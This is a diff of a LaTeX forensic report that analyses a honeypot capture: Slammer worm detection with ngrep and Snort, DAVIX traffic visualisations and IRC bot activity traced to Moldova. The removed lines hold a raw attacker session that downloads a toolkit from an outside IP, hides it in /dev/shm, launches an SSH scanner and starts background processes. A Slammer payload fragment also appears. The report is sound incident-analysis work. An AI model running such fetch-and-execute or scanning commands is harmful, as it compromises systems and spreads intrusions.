-"    [K  [Khttp://             [C [1@"  [1P [1P  [1P [1@h [C [C [C [C [C [C [C [C  [K  [Kwww.kernel.org/pub/linux/kenr  [K  [Krnel/v2.6/linux-2.6.28.tar.b  [Kgz
-http://www.kernel.org/pub/linux/kernel/v2.6/linux-2.6.28.tar.gz
+This returned a number of matches like the following.
+\begin{verbatim}
+U 2009/01/25 15:19:56.970303 194.225.233.248:2347 -> 212.110.251.3:1434
+  .......................................................................
+  .......................B.........p.B.p.B......h...B.....1...P..5..P..Qh
+  dllhel32hkernQhounthickChGetTf.llQh32.dhws2_f.etQhsockf.toQhsend..B.E.P
+  P.E.P.E.P..P...B....=U..Qt.....B....1.QQP.........Q.E.P.E.P..j.j.j..P.E
+  .P.E.P.......<a...E...@...........).....E.j..E.P1.Qf..x.Q.E.P.E.P....
+\end{verbatim}
+A google search with a portion of the printable characters indicated that this was probably the SQL Slammer worm.
+Now knowing our target, we furthur refined our search using the slammer signature \texttt{0401010101010101} obtained online from Cisco.\footnote{\url{http://www.cisco.com/global/EMEA/sitewide_assets/pdfs/tdm/threat/sqlsw_wp.pdf}}
 
-xitexit
-ext  [Kit
-Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
-Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
-w
-id
-cat /proc/cpuinfo
-adduser
-ls
-df -h
-c   ls
-cd
-ls
-mkdir " "
-cd /dev/shm
-mkdir " "
-cd " "
-ls
-pdw      wd
-ls
-wget http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
-ls
-rm -rf W2Ksp3.exe
-wget http://83.12.218.22/~test/delles.tar.gz
-tar delles.tar.gz
-^[[A^[[D                        tar xzvf delles.tar.gz
-cd delles
-ls
-chmod +x *
-i   uptime
-w
-./ss 22 -a ip -s 10^[[D^[[D^[[D^[[D                                                                        20   07      11 -s 10
-./start 202 >> /dev/null &^[[D^[[D^[[D^[[D                                                   ^[[D^[[D                                                                           81   0 Corle                >> /dev/null &^[[D
-^[[A            ^[[A^[[A^[[A                                    nohup ./start 80 >> /dev/null &
-ps x
-nohupnohup ./start 81 >> /dev/null &
-nohup ./start 81 >> /dev/null &
-nohup ./start 82 >> /dev/null &
-nohup ./start 83 >> /dev/null &
-nohup ./start 84 >> /dev/null &
-nohup ./start 85 >> /dev/null &
-nohup ./start 86 >> /dev/null &
-nohup ./start 87 >> /dev/null &
-nohup ./start 88 >> /dev/null &
-nohup ./start 89 >> /dev/null &
-nohup ./start 90 >> /dev/null &
-ps x
-pwd
-Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
-exit
-exit
-sudo bash
-top
+\begin{verbatim}
+ngrep -q -t -I jubrowska-capture_1.cap -X '0401010101010101' | less
+\end{verbatim}
+
+We found a total of 104 matches for our match expression in the 700 megabyte pcap file.
+
+Doing that sort of matching manually is a tedious and error prone task.
+So we tried to use an Intrusion Detection System (IDS) to do an automated detection of malicious traffic.
+We ran Snort against the pcap file and interestingly enough it did not show the Slammer worm propagation attempts on our first try.
+We had to modify Snorts configuration to include the ``virus'' rules (which did not work out of the box) before Snort finally detected the malicious payloads. We generated the the snort log file as follows:
+
+\begin{verbatim}
+snort -r /home/anthony/uni/forensics/jubrowska-capture_1.cap \
+    -c /root/snort/snort.bleeding.conf -A console > console-alerts
+\end{verbatim}
+
+During the analysis of the Snort logs which contained 832127 log entries, we noted that only 22976 entries related to a mixture of port scans, and worms.
+While the remaining 809151 entries related to SSH in some way.
+An example of some of the log entries in the snort scan can be seen below.
+
+\begin{verbatim}
+01/23-11:02:31.001196  [**] [1:2500264] BLEEDING-EDGE COMPROMISED
+    Known Compromised or Hostile Host Traffic (265) [**]
+    [Priority: 0] {TCP} 83.7.245.204:22 -> 212.110.251.3:37761
+01/23-11:02:31.026947  [**] [1:2001219] BLEEDING-EDGE Potential SSH Scan
+    [**] [Classification: Attempted Information Leak] [Priority: 2]
+    {TCP} 212.110.251.3:57172 -> 83.7.246.104:22
+\end{verbatim}
+
+The first log entry highlights that some known compromised traffic was seen in the pcap file.
+The second entry highlights a potential SSH scan.
+%\FIXME{Maybe map the target IP addresses No time to do this.}
+
+
+
+
+\section{DAVIX Scripts}  \label{sec:davix}
+At various stages during the analysis, we made use of the scripts included in the DAVIX image.
+These were useful as a summary of the events in the pcap files, though on their own were of limited use.
+There were, however, some interesting features that they helped us to reveal.
+
+Many of the scripts proved useless in this particular instance.
+For example, the script to display HTTP traffic gave no important information as there was barely any HTTP traffic at any stage of the capture.
+
+Conversely, the script (\texttt{006\_activity\_connections\_tcp\_ports.sh}) to map out TCP traffic was far more useful.
+The script extracts information on TCP between IPs in the capture and renders the result as a map in Afterglow.
+We used this tool to examine each section of the capture.
+For the most part the results seemed relatively normal, however we did find an unusual surge of traffic in the ninth section.
+
+\begin{figure}
+    \begin{center}\includegraphics[width=\textwidth]{bin/09_messy.png}\end{center}
+    \caption{Surge of TCP Traffic}
+    \label{pic:messy_chart}
+\end{figure}
+
+Using the script \texttt{012\_activity\_tcpdstport\_r.sh} we were able to plot all the destinations of the TCP traffic to a chart in R.
+At four points in this chart we can see vertical lines, indicating a surge in TCP traffic across many ports.
+We can see that there is far more activity around the lower ports and it eases off towards the higher ones.
+The nature of these lines, combined with the observations made earlier, would indicate that a port scan is taking place.
+
+\begin{figure}
+    \begin{center}\includegraphics[width=\textwidth]{bin/09_tcp_r.png}\end{center}
+    \caption{TCP Port Activity, a close up of \autoref{pic:dest-ports-over-time}}
+    \label{pic:tcp_r}
+\end{figure}
+
+There are also two heavy blue lines across many of the plots generated by this script.
+One is just above 0, so it would make sense to assume that this is port 80 and what we are seeing is standard network traffic.
+The second is a bit below 10000.
+Given that we know there was a lot of IRC traffic during the capture, this is likely port 6667 as this is usually used for IRC.
+
+Another tool which was somewhat useful was the script for mapping IP addresses to their appropriate MAC addresses.
+However, some modification was needed to maximise its usefulness.
+One problem, for example, was that so many IPs were used during the capture that Afterglow would run out of memory and crash when trying to render some of the more complex parts of the capture file.
+We managed to fix this by applying a subnet filter to any IP addresses collected, therefore cutting the amount of nodes needed to be rendered to just a fraction of what it was. The filter was implemented by replacing the line:
+
+\verb#cat d_ip_mac.csv | sort | uniq > d_ip_mac_distinct.csv#
+
+with:
+
+\begin{verbatim}
+cat d_ip_mac.csv | sed -e s'/212\.110\.251\.3/Honeypot/g'|
+    sed -e s'/208\.67\.222\.222/Gateway/g' |
+    sed -e s'/\.[0-9]*\.[0-9]*\,/\.0\.0\,/g'|
+    sort | uniq > d_ip_mac_distinct.csv
+\end{verbatim}
+
+This also renamed the IPs \texttt{212.110.251.3} to ``Honeypot'' and \texttt{208.67.222.222} to ``Gateway''.
+This served two purposes; Firstly, it meant that the Gateway and Honeypot were easy to find amongst all the numbers in the diagram.
+Secondly, it prevented these two important IPs from being removed by the filter.
+We also edited the \texttt{color.properties} file associated with Afterglow to give each important element their own colour.
+
+\begin{figure}
+    \begin{center}\includegraphics[width=\textwidth]{bin/colourmap.png}\end{center}
+    \caption{IP to MAC mappings}
+    \label{pic:colourmap}
+\end{figure}
+
+
+
+
+
+
+\section{IRC Traffic} \label{sec:irc-traffic}
+We did some analysis on the IRC traffic contained in the pcap file using \texttt{ngrep} which outputs everything as standard ASCII text by default.
+
+\begin{verbatim}
+ngrep -q -I jubrowska-capture_1.cap PRIVMSG | less
+\end{verbatim}
+
+Below you can see a small portion of the IRC traffic.
+Getting Google Translate\footnote{\url{http://translate.google.com/}} to translate this text revealed it to be Romanian or some language close to this.
+Another interesting observation is that the attackers were talking in an IRC chatroom (Channel) \texttt{\#malldova}.
+Although we could follow the conversation being made via IRC\footnote{We consider it an interesting question legal and moral whether this conversations have to be treated as private communication} we could not really make sense out of it, because we do not speak Romanian or Moldovian.
+We were, however, able to extract some parts which talked about a city in Moldovia.
+By further observing the nicknames the attackers chose and the way they talk, we could probably identify the actual persons that launched the attacks.
+
+
+\begin{verbatim}
+T 208.83.20.130:6667 -> 212.110.251.3:46937 [AP]
+  :Alejik!AleG_20@1albaiulia.users.undernet.org PRIVMSG
+  #CaNaL+ :eu si eri am intrat si tu pleci si azi tot asa :) nu e bine ..
+
+T 195.47.220.2:6667 -> 212.110.251.3:59407 [AP]
+  :D_12!~D12@D12UP.users.undernet.org PRIVMSG #CaNaL+ :_AngeloS_..
 \end{verbatim}
 
 
-Get all HTTP hosts in the pcap file:
-tshark -r jubrowska.pcap -R "http.request" -Tfields -e ip.src -e ip.dst -e http.host | sort | uniq
 
-One could then dwell down on the HTTP requests: tshark -r jubrowska.pcap -qz http\_req,tree
+As indicated in \autoref{sec:intro}, IRC packets was by far the most dominant type of captured traffic.
+Interestingly, the massive number of IRC packets was generated in just a fifth of the overall packet capture as per \autoref{pic:dest-ports-over-time}.
+This fact can be explained by looking at the serial I/O database (cmp.\, \autoref{sec:http-traffic} as well as the captured packets.
+The attacker downloaded and ran \emph{EnergyMech}, an ``Open source IRC bot written in C. Includes many useful features''\footnote{\url{http://www.energymech.net/}}.
+The captured packets show that the IRC bot was constantly trying to reconnect to the UnderNet IRC network.
+This also explain the massive number of DNS queries, because the bot resolved the IP addresses for the IRC network before trying to connect to it.
+The reconnections were caused by the attackers not being able to properly configuring their software.
+The bot tried to log in to the IRC service but the chosen nicknames were taken so that the server denied access.
+Reconnection attempts of the bot resulted in it being blocked because the reconnects were tried to quickly.
 
 
-I am running 007\_activity\_dnsquery.sh on my home machine atm, expect a pretty picture
 
-\section{Conclusion}
 
-We used wireshark to determine the start and end time of the complete packet capture.
-We then used a combination of \texttt{sed}, \texttt{awk} and \texttt{perl} to extract the commands issued by the attacker from the SQLite database file.
-Commands, that the attacker ran, were found and an excerpt was shown.
+
+
+
+
+
+
+
+\section{Conclusion} \label{sec:conclusion}
+
+We spent a lot of time researching and evaluating tools that could visualise the massive amount of data in the jubrowska pcap file.
+The potential tools for visualising data were assessed and critiques were given.
+Most of the tools did not satisfy us because they were either not properly network aware or could not cope with our big amount of data.
+
+Also, a general overview over the given network traffic capture, as well as the serial I/O database was given.
+We identified IRC, DNS and SSH as the most spoken protocols.
+SSH did not come as a surprise because it is the protocol of choice to connect to the honeypot as well as other target machines.
+The DNS and IRC traffic were identified to be related in a way: The attackers were not able to configure their IRC bots properly which resulted in constant reconnects to different IRC servers.
+
+
+Using the tools included in the DAVIX image we were able to visualise the network at various times during the trace. Peaks in TCP traffic at certain times and unusually heavy IRC activity led us to investigate further and uncover the nature of the attack.
+
+Traffic relating to the Slammer worm was identified by first searching fot NOP slides and then later for the worm signature string.
+
+Other types of traffic, including HTTP, SSH and IRC, was analysed and each investigation yielded information that is not only able to identify the attack but also to potentially pinpoint the attackers.
+We thus found out that at least some of the attackers are most likely located in Moldova.
+
+Surely, we could further investigate simply because the amount of data is huge.
+Further analysis could produce more pictures that have a time dimension or create an animation of the changes of some visualised information.
 
 %\appendix
 %\pagebreak
